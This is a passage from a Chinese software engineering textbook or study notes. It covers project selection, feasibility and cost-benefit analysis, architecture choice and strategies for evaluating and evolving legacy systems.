技能是否能满足要求，是否需制定相关的系统维护、运行规约和规章制度等。而项目实施的实际开销，除购买产品或服务的开支外，通常还包括各种系统维护、改进、培训，招聘新职员，变更业务流程等各种应用方面的开销。以总持有成本（Total Owner Cost，TOC）来评估信息化的代价才能比较准确地得到项目的实际代价。  &emsp;&emsp;评估项目风险、预期收益和代价后，可筛选掉多数不符合企业要求的建议项目。#### 3．评估项目的多种实施方式&emsp;&emsp;对于已经确认有价值、并且有能力开发的软件项目，则可以进一步参照企业现状考察项目的实施方式。这种实施方式通常既包括了前面对项目风险、预期收益和资源开销的评估，也包含了企业对现阶段经营目标和现有资源如何合理运用的考虑。这个过程通常由项目的负责人和企业中高层经理进行决策，决策结果决定了项目的实施优先级及具体的实施方式。  &emsp;&emsp;需要说明的是，企业完成软件项目的方式并不单纯限制于自己组建开发团队进行软件项目或软件产品开发的策略。根据具体情况不同，还可能使用诸如转包开发业务给外部公司、直接 OEM（Original Equipment Manufacture，原始设备制造商）软件产品并进行系统集成、购买关键技术并进行“软件集成”方式的开发、完成技术方案和设计，然后寻求外部公司进行编码等各种方式。对这些项目实施方式的取舍，主要依据依然是对项目风险、收益和资源开销综合平衡的考虑。#### 4．平衡地选择适合的方案&emsp;&emsp;人们在选择可行的方案时，总是希望得到高质量、低成本的产品和方案。软件开发人员通常也很愿意在产品开发中，向产品加入创造性的内容。另一方面，客户单位在面对诸多的投标方案时，会听到各种各样关于技术先进性、快速开发、产品质量稳定可靠、价格如何低廉、推荐的方案有多少成功应用等宣传。然而：1. 新技术可能意味着未来更多的变化从而导致风险，也意味着未来产品的使用者需要更多的学习和导入期，而采用成熟的技术则可能享受不到新技术带来的好处。2. 不基于某种快速开发技术或平台构造的产品可能会延长项目开发时间从而导致更多的开销，但基于某种平台的产品又可能使得用户未来“绑定”在某种平台之上，减少未来的自由选择性。3. 不考虑系统的扩展性则很可能在业务变更时，会受阻于已经实施的 IT 设施，但过多考虑系统的扩展性，软件接口通常就需要花费较大的力气进行设计，那么用户是否在当前的购买中为一些自己并不需要的特性多支付成本？尤其在软件技术高速发展的今天，当用户期望进行系统升级的时候，常常会发现原来的计算体系已经早就被开发单位淘汰和抛弃。4. 价格低廉的产品可能具有好的质量，也可能有些功能并不那么让人满意，而最重要的是，当关注这些具有先进性、低成本及拥有众多成功应用的产品或方案的时候，项目的选择者容易失去对自己目标的关注，即这些先进技术或宣传的产品特性是否确实是自己需要的？&emsp;&emsp;事实上，对性能的要求常常是充满矛盾的，任何时候都不存在一个完美无缺的方案，只存在一个对当前的项目目标相对比较适合的方案。项目的决策者必须从最终的项目目标出发，判明各种功能或性能的重要性和优先级。在抛弃明显存在问题的“差”项目后，选择项目的基本立场应该是“适合”，而不是尽可能的“好”。（实际上任何超出预期设定目标的“好”性能，通常都意味着更多的成本。）  &emsp;&emsp;更进一步地看，“适合”的方案就是平衡考虑开发单位利益和客户满意度的方案。![顾客质量模型图](https://pic.lufer.cc/images/2021/03/15/sWYfHg.png)&emsp;&emsp;上图是 Noriaki Kano 提出的顾客质量模型图，要求质量是客户认为产品应该具备的功能或性能，实现越多客户会越满意；假想质量是客户想当然认为产品应具备的功能或性能，客户并不能正确描述自己想当然要得到的这些功能或性能需求；兴奋质量则是客户要求范围外的功能或性能（但通常是软件开发者很乐意赋予产品的技术特性），实现这些性 能客户会更高兴，但不实现也不影响其购买的决策。  &emsp;&emsp;显然，项目开发方更多考虑的是项目风险和回报。而客户更多关心的是成本和购买后的满意度。好的方案必须平衡考虑这些因素。系统分析师应尽可能用技术手段来平衡这些彼此对立的要求，保证在项目预期投入资源可接受的范围内，尽量实现客户要求质量对应的功能和性能、发掘客户假想质量对应的功能要求并进行沟通确认，但按自身所服务企业的经营目标平衡考虑客户兴奋质量的实现策略（是努力提供兴奋质量的功能、争取忠诚的客户获得远期潜在的收益，还是削减这些功能、以便使项目的成本最小化）。>系统设计师常犯的一个错误，就是用自己对技术的兴趣产生的兴奋质量，来替换客户最基本的要求质量和假想质量。而企业经营者常犯的错误，则可能是对客户提出的合理要求质量视而不见；或者走向另一个极端，不加区分地把一切未经评估的假想要求质量不断指派给软件开发团队。这些都是错误的做法。### 7.1.3 项目提出和选择的结果&emsp;&emsp;系统项目提出和选择的结果，最终会以“产品/项目建议书”的方式来体现。典型的应用场景是：1. 在投标项目中，产品/项目建议书通常是乙方提交给甲方竞标方案的一部分；2. 企业单位在确立了要开发某类型产品后，对该产品进行多角度的评估，最终项目立项人向上级提交供决策的建议报告的主要内容就是“产品/项目建议书”。&emsp;&emsp;产品/项目建议书是一个包含多种综合内容的报告，涉及的范围通常要比《GB8567-1988》标准中规定的标准——“项目可行性分析报告”的内容更全面。在项目建议书中，可能包含如下几个部分：>用户单位、项目或产品的立项背景、需求来源和目标性的介绍；  >用户的内外部环境、组织机构、现有的 IT 设施情况等；  >用户的业务模型和业务规划；  >预期要建设的技术系统在用户业务中的位置和作用；  >信息化后的用户业务模型、软件应用方式、相关的部署环境、运行规则、管理规范等；  >为实现信息化业务模型，技术系统的产品需求定义（功能、性能、约束）和部署方式等；  >产品或项目的技术框架；  >项目的要点、技术难点、主要实施障碍等；  >项目或产品的可行性研究结果；  >项目可选择的实施方式、组织方式、沟通和协调机制等；  >项目的资源范围和预算（人、财、物、时间等）；  >项目的成本/收益分析；  >……&emsp;&emsp;其他项目建议书可能包含的内容，或以单独文档列举的内容可能包括：>项目风险及影响评估；  >项目进度计划；  >项目质量计划；  >项目过渡期资金的获得方式、财务计划；  >产品或项目的商务模式、盈利模式论述；  >同类产品或公司的市场调查结果，以及竞争性比较；  >企业成功案例、资质等；  >商务条款或供应商/客户合同；  >……&emsp;&emsp;项目建议书标志着项目立项和选择阶段性工作的完成，一旦项目建议书被批准通过，项目即可进入正式的开发准备和实施阶段。## 7.2 可行性研究与效益分析&emsp;&emsp;在项目计划和选择的过程中，需要完成的首要目标是对项目进行估算。项目估算的范围涉及方方面面，例如项目或产品开发的范围、投入和回报、项目风险、作用和意义等。在传统软件工程方法中，是以`可行性研究`的方式来组织项目的主要估算内容。  &emsp;&emsp;可行性研究的范围可能覆盖技术、经济、执行、环境等各种需要评估的因素，但它并不是最后的详细计划（例如：项目的时间进度及人员安排）。通常在进行可行性研究的阶段，项目的目标或产品的最终方向也是极易变化的。  &emsp;&emsp;但可行性研究的意义在于，虽然可行性研究不能指出项目最终的详细计划和方向，但可行性研究可以在项目定义阶段用较小的代价识别出错误构思的系统，从而规避未来更多的资源投入的损失（时间、资金、人力、机会），或者因遭遇到无法逾越的技术障碍或环境障碍导致的不可避免的失败。  &emsp;&emsp;对于那些可行性研究表明可执行的软件项目来说，可行性研究的结果也不承诺系统的收益一定很大或技术风险和资源投入就一定很低，但可行性研究的结果设立了一个“底线”，即如果做什么，风险和收益是什么样的控制范围。这些评估结果给了未来的项目评估、项目风险控制，甚至在资源剧烈变化的情况下有计划有重点地削减功能、重定义项目开发范围，提供了非常有价值的方向性指引。### 7.2.1 可行性研究的内容&emsp;&emsp;可行性研究的主要内容包括`经济可行性`、`技术可行性`、`法律可行性`、`执行可行性`和`方案的选择` 5个部分。#### 1．经济可行性&emsp;&emsp;经济可行性主要评估项目的开发成本及项目成功后可能获得的经济收益。多数项目只有开发成本能控制在企业可接受的范围内的时候，项目才有可能被批准执行。而经济收益的考虑则非常广泛，例如：项目技术开发的直接现金收入、新产品在生命周期中预期的总销售收入、技术积累、对公司业务和产品线的完善和支持、开辟新市场和利润增长点、进入预期能带来较高收益的新市场、提高客户满意度和忠诚度、打击竞争对手抢夺市场份额、获得新的信息化能力从而改善经营或管理格局等。#### 2．技术可行性&emsp;&emsp;技术可行性评估对于假想的软件系统需要实现的功能和性能，以及技术能力约束。技术可行性分析可通过“提问—回答”的方式来进行论证，包括：1. 技术  &emsp;&emsp;现有的技术能力和 IT 技术的发展现状足以支持想象中的系统目标实现吗？2. 资源  &emsp;&emsp;现有的资源（掌握技术的职员、公司的技术积累、构件库、软硬件条件等）足以支持项目实施吗？技术风险在评估的哪个范围内？3. 目标  &emsp;&emsp;在目前设定的系统目标中，哪些目标会遭遇到较强的技术障碍？尤其是那些被设定为必须实现的系统目标。&emsp;&emsp;由于在可行性研究阶段，项目的目标是比较模糊的，因此技术可行性最好与项目功能、性能和约束的定义同时进行。在可行性研究阶段，调整开发目标和选择可行的技术体系均是可用的手段，而一旦项目进入开发阶段，任何调整都意味着更多的开销。  &emsp;&emsp;需要再次指出的是，技术可行性绝不仅仅是论证在技术上是否可实现，实际上还包含了在当前资源条件下的技术可行性。  &emsp;&emsp;投资不足、时间不足、预设的开发目标技术难度过大、没有足够的技术积累、没有熟练的职员可用、没有足够的合作公司和外包资源积累等均是技术可行性的约束。软件系统的技术评估者通常都只考虑技术手段是否能实现而忽视了当前的资源条件和环境，从而对技术可行性研究得出了过于乐观的结果，这种错误判断对后期的项目实施会导致灾难性的后果！  &emsp;&emsp;加强前期的项目调研、寻求专家的咨询以及采用具有大量成功应用案例、被广泛支持的技术标准和事实标准等均有助于改善项目的技术可行性。#### 3．法律可行性&emsp;&emsp;法律可行性评估可能由系统开发引发的侵权或法律责任，可能包括合同的订立和条款，职责、侵权情况的设定，违约、争议的解决等方方面面的内容。法律可行性还包括国家政策和法律的限制，例如：在政府信息化的领域中使用未被认可的加密算法或未经许可在产品中使用了其他公司被保护的软件技术、构件等。#### 4．执行可行性&emsp;&emsp;执行可行性也称操作可行性，它主要评估预期的软件系统在真实环境中能够被应用的程度和实施过程中障碍。例如：ERP 系统建成后的数据采集和数据质量问题，或客户工作人员没有足够的 IT 技能等。这些问题虽然与软件系统本身无关，但如果不经评估，很可能会导致投入巨资建成的软件系统毫无用处。  &emsp;&emsp;执行可行性还需要评估对用户的各种影响，包括对现有 IT 设施的影响、对用户组织机构的影响、对现有业务流程的影响、对地点的影响、对经费开支的影响等。如果某项影响会过多改变客户的现状，需要将这些因素作进一步的讨论并和软件系统的使用者进行沟通，提出建议的解决方法。#### 5．方案的选择&emsp;&emsp;评估系统或产品开发的可选方法。一般来说，同样的项目，可以采用不同的方法来实现。甚至一个大项目的若干个子系统的实现方法也不一样。如何进行系统分解、如何定义各子系统的功能、性能和界面，实现方案不唯一。可以采用折中的方法，反复比较各个方案的成本和效益，选择可行的方案。### 7.2.2 成本效益分析&emsp;&emsp;效益分析实际上包含了“成本—收益”的分析。从内容上来看，效益分析是可以包含在可行性研究的经济可行性分析中的。但效益分析的目的在于，对项目开发目标的成本及可度量的项目现金收入和无形收益进行一次专门化的评估。这种以经济回报为收益的评估结果，是得到企业管理、决策层批准项目实施的重要因素。  &emsp;&emsp;效益分析中的成本分析，将尽可能地列举所有项目涉及的直接财务支出数字，以便管理层协调和制订各种资源的支出计划。效益分析中的收益分析，将尽可能清晰地列举实施项目带来的各种直接经济收益和无形收益，以便管理层理解项目的价值和给予项目资源上的支持。否则，一旦项目所需要的各种资源不能按计划投入，项目失败的风险将大大增加，并且除了变更项目预设的开发目标外，几乎没有可供选择的应急方案。#### 1．项目可能涉及的成本&emsp;&emsp;项目的成本部分，通常包括：* 基础建设支出  &emsp;&emsp;如房屋和设施，办公设备，平台软件，必需的工具软件等购置费用。* 一次性支出  &emsp;&emsp;如研究咨询费用、调研费、管理费用、培训费、差旅费、其他一次性杂费等。* 运行维护费用  &emsp;&emsp;如设备租金和定期维护费用、定期消耗品支出、通信费、人员工资奖金、房屋租金、公共设施维护及其他经常性的支出项目。#### 2．项目可能涉及的收益&emsp;&emsp;项目的收益，通常可以分为`一次性收益`、`非一次性收益`和`不可定量的收益`三个部分。1. 一次性收益    * 开支的缩减      &emsp;&emsp;包括改进了的系统的运行所引起的开支缩减，如资源要求的减少，运行效率的改进，数据进入、存储和恢复技术的改进，系统性能的可监控，软件的转换和优化，数据压缩技术的采用，处理的集中化和分布化等。    * 价值的增升      &emsp;&emsp;包括由于一个应用系统的使用价值的增升所引起的收益，如资源利用的改进，管理和运行效率的改进及出错率的减少等。    * 其他      &emsp;&emsp;如从多余设备出售回收的收入等。2. 非一次性收益  &emsp;&emsp;在整个系统生命期内由于运行所建议系统而导致的按月的、按年的能用人民币表示的收益，包括开支的减少。3. 不可定量的收益  &emsp;&emsp;无法直接用人民币表示的收益，如服务的改进，由操作失误引起的风险的减少，信息掌握情况的改进，组织机构给外界形象的改善等。有些不可捉摸的收益只能大概估计或进行极值估计（按最好和最差情况估计）。#### 3．效益分析的若干指标和进一步的分析1. 收益/投资比  &emsp;&emsp;软件项目实施后整个系统生命期的收益/投资比值。2. 投资回收周期  &emsp;&emsp;收益的累计数开始超过支出的累计数的时间。3. 敏感性分析  &emsp;&emsp;分析项目中的一些关键性因素如系统生命期长度、系统的工作负荷量、工作负荷的类型、处理速度、设备和软件的配置等因素发生变化或进行合理搭配时，对开支和收益的影响最灵敏的范围估计。通常当项目需要在不同因素之间取舍和调整的时候，需要参考敏感性分析的内容。### 7.2.3 可行性分析报告&emsp;&emsp;在国家标准《GB8567-1988》中，规定了可行性分析报告的详细格式和内容。这个规范文本基本上涵盖了可行性分析需要考察的问题，可作为书写可行性研究报告的参考文档模板。 不管可行性报告的形式如何，最重要的内容应当有以下几项。* 项目背景：包括问题描述、实现环境和限制条件；  * 管理概要和建议：包括重要的研究结果、说明、建议和影响；  * 候选方案：包括候选系统的配置和最终方案的选择标准；  * 系统描述：包括系统工作范围的简要说明和被分配系统元素的可行性；  * 经济可行性（成本/效益分析）：包括经费概算和预期的经济效益；  * 技术可行性（技术风险评价）：包括技术实力、已有工作基础和设备条件；  * 法律可行性：包括系统开发可能导致的侵权，违法和责任等；  * 用户使用可行性：包括用户单位的行政管理，工作制度和使用人员的素质；  * 其他与项目有关的问题：例如，其他方案介绍和未来可能的变化。  * 可行性研究报告首先由项目负责人审查（审查内容是否可靠），再上报给上级主管审阅（评估项目的地位）。从可行性研究报告中应当得出“行或不行”的决断。## 7.3 方案的制订和改进&emsp;&emsp;在系统方案阶段，主要完成的工作则是解释“系统如何实现”的问题。系统方案制订的最主要内容，包括以下几个方面。### 7.3.1 确定软件架构&emsp;&emsp;在问题定义阶段得到的软件概念模型使用各种工具定义了项目的开发目标。在系统方案制订阶段才开始真正考虑如何去实现软件。其中最重要的工作，就是制定系统的实现架构。  &emsp;&emsp;系统的实现架构与一些很具体的方面相关：1. 分析模型的结构  &emsp;&emsp;例如，采用结构化分析方法得到的功能分解体系，或面向对象的类和“对象－关系图”、“对象－行为图”。2. 一些对应于系统目标的最基本、最重要的实现要素  &emsp;&emsp;例如，关键的用例、最主要的控制类、对象组织的模式、常用和最关键的实现算法模型等。这些实现要素对应于系统目标实现最重要的场景，表示了整个系统最主要的控制流程和实现机制。3. 特性和要点的解释  &emsp;&emsp;这些附加的内容解释系统的一些特性、服务等是如何实现的。### 7.3.2 确定实现的各种关键性要素和实现手段关键性的实现要素&emsp;&emsp;通常包括：* 关键的用例、最主要的控制类、功能和服务的首要组织方式（例如网站首页）；* 对象的组织模式；* 常用和最关键的实现算法模型。关键性的实现手段通常包括：* 选定基础计算平台，如操作系统、数据库、Web 服务器、中间件平台等；* 选定开发工具和开发环境，如计算机语言、构件库、工具软件等。### 7.3.3 归结目标到最适合的计算体系&emsp;&emsp;通常，提供开发工具和开发环境的组织总是有一些标准的计算体系可以选择（例如.NET和 J2EE 等），因此对于大多数系统开发项目来说，比较各种标准计算体系与预期目标之间的匹配程度即可选定计算体系。选择标准的计算体系去实现系统可以忽略大多数基础平台和底层支撑技术的实现问题，从而大大提高系统的质量、降低开发风险和成本。开发人员常根据基础平台的系统实现能力支持，公司或项目组在特定实现平台上的技术积累，甚至技术的“先进性”或流行程度这样的因素去选择系统的实现技术体系。  &emsp;&emsp;在另一些情况下，出于各种诸如用户投资力度，与用户现有的 IT 设施保持一致性、兼容性、扩展性及未来维护的能力等因素，系统的基础平台很可能在项目的论证阶段就已经被确定，如操作系统、数据库系统、Web 服务器、开发工具或开发环境等。在这种情况下，系统的实现体系实际上已经确定。  &emsp;&emsp;通过同时参考系统概念模型，将前面得到的系统功能清单和系统实现的各种关键要素整理并分类，然后与现有的技术、标准的实现体系进行比较和匹配，就可以将系统概念模型定义的系统目标，进一步映射到真正可计算、可实现的系统架构上。这个过程可以理解为一种不断归结、比较并匹配的过程。  &emsp;&emsp;进行匹配的过程常常是一种双向的选择和探究过程，一方面拿出一个系统目标中的功能或实现要素，询问：这部分功能属于表示层、业务逻辑、还是数据服务？另一方面，也研究标准计算体系提供的功能，例如：放在业务逻辑层合适吗？技术人员具有这方面的开发经验积累吗？甚至是标准构件或服务可用吗？   &emsp;&emsp;各种标准的计算体系可能很复杂，但通常总是包括一些逻辑上的划分，例如，.NET 体系将应用系统理解为表示层、事务逻辑层和数据服务层三个层次构成。1. 表示层  &emsp;&emsp;用户的界面部分。例如，单一应用程序的用户界面、C/S 计算模式的客户端、B/S 模式在浏览器中运行的 HTML、DHTML、Scripting、JavaApplet、ActiveX 等。2. 事务逻辑层  &emsp;&emsp;负责处理表示层的应用请求，完成商务逻辑的计算任务，并将处理结果返回给用户。事务逻辑处理层是将原先置于客户端的事务逻辑分离出来，集中置于服务器部分，为所有用户共享。事务逻辑层是整个应用的核心部分，而组件对象模型 COM 则相当于其心脏。事务逻辑层通过 COM 进行事务处理，并由 IIS（Internet Information Server，Internet 信息服务器）和 MTS（Microsoft Transaction Server，微软事务处理服务器）为各种应用组件提供完善的管理。3. 数据服务层  &emsp;&emsp;为应用提供数据来源。和以往的两层架构不同，数据库不再和每个活动客户保持一个连接，而是若干个客户通过应用逻辑组件共享数据库的连接，从而减少连接次数，提高数据服务器的性能和安全性。&emsp;&emsp;相同的三层计算模式，也会表现为不同的实现方式。例如，表示层可能是单一应用系统的用户界面、C/S 计算的客户端、或 B/S 计算的 Web 页面和元素；事务逻辑层可能是单一应用系统的程序模块、C/S 的服务器端服务、B/S 应用服务器中的业务脚本或业务对象；当利用类似存储过程来实现数据操作逻辑的时候，存储过程也被看作事务逻辑层的一部分，但如果利用 ADO（ActiveX Data Object，ActiveX 数据对象）这样的数据访问组件访问数据时，ADO 和后台的数据库系统及数据库的逻辑则被看作数据服务层的一部分。  &emsp;&emsp;在必要的情况下，某个层次还可能进一步细分，例如，使用面向对象设计方法的系统常常会将事务逻辑层划分为基本的计算对象、业务对象及黏合业务对象实现功能的脚本 “胶水”或一些控制类。  &emsp;&emsp;不同标准的计算体系的逻辑划分，甚至同一个计算体系的不同版本，通常也不会套用这样的三层分类方式，但却有类似之处。下图表示了利用 JSP 开发 Web 程序的计算模式。JSP 页面构成了前端的表示层，EJB 构成了业务逻辑层，JDBC（Java DataBase Connectivity，Java 数据库连接）和后台的数据库构成了数据服务层。![利用 JSP 开发 Web 程序的计算模式](https://pic.lufer.cc/images/2021/03/15/sI0gvF.png)&emsp;&emsp;对于小规模的网站系统，开发者可能直接在 JSP 页面中书写所有的应用逻辑脚本，这样业务逻辑层就和表示层合并了，而对于使用 J2EE 体系的开发人员来说，利用 EJB 的容器、对象操作语言等机制直接实现了对象级的接口，开发人员直接在业务逻辑层去构思应用，JDBC 和后台数据库系统的数据服务层被隐含在 J2EE 的平台机制内，在更高的抽象级别上被屏蔽。  &emsp;&emsp;因此，归结系统实现要素到计算体系的时候，要点在于理解各种计算体系的大致分层和构成，比较实现要素的目标和实现手段之间的“适合程度”，而不是生搬硬套某种实现机制，或盲目追求某种“流行的”或“先进的”算体系。系统方案制订后，需要根据有关标准进行评价，找出不符合实际的地方，然后进行改进。## 7.4 新旧系统的分析和比较&emsp;&emsp;计算机技术飞速发展，日新月异，许多企业因为业务发展的需要和市场竞争的压力，需要建设新的企业信息系统。在这种升级改造的过程中，怎么处理和利用那些历史遗留下来的老系统，成为影响新系统建设成败和开发效率的关键因素之一。通常称这些老系统为遗留系统。  &emsp;&emsp;目前，学术和工业界对遗留系统的定义没有统一的意见。Bennett 在 1995 年对遗留系统做了如下的定义：遗留系统是不知道如何处理但对组织又至关重要的系统。Brodie 和Stonebraker 对遗留系统的定义如下：遗留系统是指任何基本上不能进行修改和演化以满足新的变化了的业务需求的信息系统。  &emsp;&emsp;笔者认为，遗留系统应该具有以下特点：1. 系统虽然能完成企业中许多重要的业务管理工作，但已经不能完全满足要求。一般实现业务处理电子化及部分企业管理功能，很少涉及经营决策。2. 系统在性能上已经落后，采用的技术已经过时。如多采用主机/终端形式或小型机系统，软件使用汇编语言或第三代程序设计语言的早期版本开发，使用文件系统而不是数据库。3. 通常是大型的系统，已经融入企业的业务运行和决策管理机制之中，维护工作十分困难。4. 系统没有使用现代系统工程方法进行管理和开发，现在基本上已经没有文档，很难理解。&emsp;&emsp;在企业信息系统升级改造过程中，如何处理和利用遗留系统，成为新系统建设的重要组成部分。处理恰当与否，直接关系到新系统的成败和开发效率。遗留系统的演化方式可以有很多种，根据系统的技术条件、商业价值及维护和运行系统的组织特征不同，可以采取继续维护、某种形式的重构或替代策略，或者联合使用几种策略。究竟采用哪些策略来处理遗留系统，需要根据对遗留系统的所有系统特性的评价来确定。### 7.4.1 遗留系统的评价方法&emsp;&emsp;对遗留系统评价的目的是为了获得对遗留系统更好的理解，这是遗留系统演化的基础，是任何遗留系统演化项目的起点。本文的评价方法包括度量`系统技术水准`、`商业价值`和`与之关联的组织特征`，其结果作为选择处理策略的基础。  &emsp;&emsp;评价方法由一系列活动组成，如下图所示。![评价活动](https://pic.lufer.cc/images/2021/03/15/sIBWz8.png)#### 1．启动评价&emsp;&emsp;评价是为了获得对遗留系统的足够深度的理解，从技术、商业和企业角度对系统的理解为系统处理策略提供基础，开始评价前，需要了解以下问题。1. 对企业来说，遗留系统是否是至关重要的  &emsp;&emsp;在评价过程中，可能会发现系统对企业的继续运作产生的影响不大。在这种情况下，就没有必要考虑系统的演化问题。2. 企业的商业目标是什么  &emsp;&emsp;从商业观点来看，评估师必须理解企业的商业目标，因为商业目标产生演化需求。3. 演化需求是什么  &emsp;&emsp;演化需求来自企业的商业目标和评价活动。需求必须是可见的，以便决定已存在的系统是否能满足需求。4. 所期望的系统寿命多长  &emsp;&emsp;一个系统的寿命由软件和硬件的服务能力决定，一旦系统硬件或支撑软件过时，系统的有效性就受到限制。5. 系统使用期限多久  &emsp;&emsp;如果系统的使用期限只是短期的，就没有必要花费成本来演化系统。相反，如果系统将在相当长的时期内支持主要业务流程，则必须进行演化。6. 系统的技术状态如何  &emsp;&emsp;例如，如果应用软件的技术状况很差，则很难理解，维护费用会很高。7. 企业是否愿意改变  &emsp;&emsp;企业对改变的态度是遗留系统演化成功的关键因素之一。8. 企业是否有能力承受演化  &emsp;&emsp;企业的技术成熟度，员工的素质，支撑工具的级别等都是影响演化的因素。#### 2．商业价值评价&emsp;&emsp;商业价值评价的目标是判断遗留系统对企业的重要性。在多数情况下，重要业务过程的改变意味着旧的系统现在仅仅具有外围价值，修改这种系统只需花费少许财力和物力。  &emsp;&emsp;在其他情况下，系统的业务价值很大，需要继续维护运行。可以在概要和详细两个级别上进行遗留系统的商业价值评价。&emsp;&emsp;概要级评价将为更加详细的分析提供信息。概要级评价包括：1. 咨询  &emsp;&emsp;向有关专家进行咨询，包括最终用户和负责业务处理的管理人员。2. 评价问卷  &emsp;&emsp;问卷应该标识系统在业务处理过程中的哪些地方使用，本系统与其他系统的关系，如果系统不再运行所需的代价，系统已有的缺点和存在的问题等。问题的准确性依赖于所评价的系统。3. 进行评价  &emsp;&emsp;有了问卷的基础后，必须认真分析系统是如何使用的，这往往会发现系统的价值，而这在问卷中是得不到的。>详细级评价包括应用系统不符合业务规范的风险分析，这种分析十分费时，最好由业务分析师来完成详细级的评价。#### 3．外部环境评价&emsp;&emsp;外部环境评价系统的外部技术环境是指硬件、支撑软件和企业基础设施的统一体。1. 硬件  &emsp;&emsp;系统硬件包括许多需要进行常规性维护的部件，这些硬件或者在一个站点，或者分布在许多站点并由网络连接。一般来说，遗留系统的硬件包括主机和小型机、磁盘驱动器、磁带、终端、打印机和网络硬件。  &emsp;&emsp;与商业价值评价类似，硬件评价也可以分为概要级评价和详细级评价。概要级评价把遗留系统作为一个整体，提供硬件质量估计。详细级评价包括识别系统中的每个部件。在这两种情况下，必须识别一系列特征，用作评价的基础。特征的选择取决于要评价的系统，系统的一些常见特征有供应商、维护费用、失效率、年龄、功能、性能等。  &emsp;&emsp;具体评价方法是：每一个部件（或整个系统）在每个特征上分配一个价值分数（取值为1～4），然后把所有分数相加，获得该部件的总分。2. 支撑软件  &emsp;&emsp;系统的支撑软件环境也由许多部分组成，可包括操作系统、数据库、事务处理程序、编译器、网络软件、应用软件等。一般来说，支撑软件是依赖于某个硬件的，应用软件依赖于系统软件。在评价过程中，必须考虑这种依赖性。支撑软件的评价方法类似于硬件评价，在此省略。3. 企业基础设施  &emsp;&emsp;企业基础设施包括开发和维护系统的企业职责和运行该系统的企业职责（两者可能为同一个企业），这些基础设施是很难评价的，但对遗留系统的演化起关键作用。因此必须考虑以下问题：1. 企业和使用者的类型  &emsp;&emsp;企业或者有自己的系统开发队伍，或者所有开发和应用管理都是请其他企业完成。系统用户或许只重复一些记录性工作，或许包括一些更有技术性的工作。开发组织的技术成熟度。  2. 开发组织的技术成熟度  &emsp;&emsp;包括是否使用了现代系统工程方法，是否遵循了统一的标准，是否进行了过程改进等。  3. 企业的培训过程  &emsp;&emsp;如果企业（包括开发方和客户方）的培训做得好，遗留系统的演化可能会更成功。  4. 系统支持人员的技术水平  &emsp;&emsp;如果系统支持人员的水平和经验不够，就不要急于对系统做大的改动。  5. 企业是否愿意改变  &emsp;&emsp;企业对改变的态度是遗留系统演化成功的关键因素之一。企业基础设施的评价方法类似于硬件评价，在此省略。#### 4．应用软件评价&emsp;&emsp;应用软件评价也有两个级别。1. 系统级  &emsp;&emsp;把整个系统看作是不可分的原子，评价时不考虑系统的任何部分。2. 部件级  &emsp;&emsp;关注系统的每个子系统，考虑每个子系统的特征，包括复杂性、数据、文档、外部依赖性、合法性、维护记录、大小、安全性等。&emsp;&emsp;具体评价方法也与硬件评价类似，在此省略。#### 5．分析评价结果评价&emsp;&emsp;活动将产生硬件、支撑软件、企业基础设施和应用软件的特征值矩阵，这些特征值体现了遗留系统当前的技术因素，其加权平均值代表了系统的技术水平。  &emsp;&emsp;计算公式如下：$$OR=(P1ORH+P2ORS+P3OAF+ P4ORA)/4$$&emsp;&emsp;其中 ORH 是硬件的评价值，ORS 是支撑软件的评价值，ORF 是企业基础设施的评价值，ORA 是应用软件的评价值，Pi (1 i 4) 分别是它们的权系数，即第 i 个评价值对遗留系统的影响因子。  &emsp;&emsp;把对技术水平的全面评价结果与商业评价进行比较，可以为系统演化提供第一手的资料。具体方法是按照商业评价分值和技术水平分值的情况，把评价结果分为四种类型，如下图所示。![评价结果分析](https://pic.lufer.cc/images/2021/03/15/sIrRKS.png)### 7.4.2 遗留系统的演化策略&emsp;&emsp;在评价结果分析图中，把对遗留系统的评价结果分列在坐标的四个象限内。对处在不同象限的遗留系统采取不同的演化策略。#### 1．淘汰策略&emsp;&emsp;第 3 象限为低水平、低价值区，即遗留系统的技术含量较低，且具有较低的商业价值。对这种遗留系统的演化策略为淘汰，即全面重新开发新的系统以代替遗留系统。  &emsp;&emsp;完全淘汰是一种极端性策略，一般是企业的业务产生了根本的变化，遗留系统基本上不再适应企业运作的需要；或者是遗留系统的维护人员、维护文档资料都丢失了。经过评价，发现将遗留系统完全淘汰，开发全新的系统比改造旧系统从成本上更合算。  &emsp;&emsp;对遗留系统的完全淘汰是企业资源的根本浪费，应该善于“变废为宝”，通过对遗留系统功能的理解和借鉴，可以帮助新系统的设计，降低新系统开发的风险。#### 2．继承策略&emsp;&emsp;第 4 象限为低水平、高价值区，即遗留系统的技术含量较低，可满足企业运作的功能或性能要求，但具有较高的商业价值，目前企业业务对该系统仍有很大的依赖性。对这种遗留系统的演化策略为继承。在开发新系统时，需要完全兼容遗留系统的功能模型和数据模型。为了保证业务的连续性，新老系统必须并行运行一段时间，再逐渐切换到新系统上运行。  &emsp;&emsp;要做到对遗留系统的继承，必须对系统进行分析，得到旧系统的功能模型和数据模型，这种分析可以部分代替或验证系统的需求分析。  &emsp;&emsp;如果遗留系统的维护文档不完整，而又必须解析系统的功能模型和数据模型，那将是一项十分艰巨的任务。这时可使用有关系统重构的 CASE 工具，通过分析系统的代码生成系统结构图或其他报告。#### 3．改造策略&emsp;&emsp;第 1 象限为高水平、高价值区，即遗留系统的技术含量较高，本身还有较大的生命力，且具有较高的商业价值，基本上能够满足企业业务运作和决策支持的要求。这种系统可能建成的时间还很短，对这种遗留系统的演化策略为改造。  &emsp;&emsp;这些改造包括系统功能的增强和数据模型的改造两个方面。系统功能的增强是指在原有系统的基础上增加新的应用要求，对遗留系统本身不做改变。数据模型的改造是指将遗留系统的旧的数据模型向新的数据模型转化的过程。#### 4．集成策略&emsp;&emsp;第 2 象限为高水平、低价值区，即遗留系统的技术含量较高，但其商业价值较低，可能只完成某个部门（或子公司）的业务管理。这种系统在各自的局部领域里工作良好，但从企业全局来看，多个这样的系统，他们各自基于不同的平台，不同的数据模型，无法互联互通，数据还不一致，这就是很严重的问题了。  &emsp;&emsp;对这种遗留系统的演化策略为集成。  &emsp;&emsp;在集成过程中，可采用由互连系统构成的系统的架构，遗留系统可作为从属系统来描述。在企业信息系统建设过程中，如何处理那些遗留系统，将会是越来越突出的问题，因为即使是今天看来很先进的系统在明天也会成为遗留系统。对遗留系统的处理恰当与否，直接关系到新系统的成败和开发效率。如何建立一套系统的、行之有效的方法，以期望对实际工作有所指导，已成为一个迫切的问题。在实际工程项目中，遇到处理遗留系统的问题时，要具体情况具体分析，选择最佳的演化策略。# 第八章 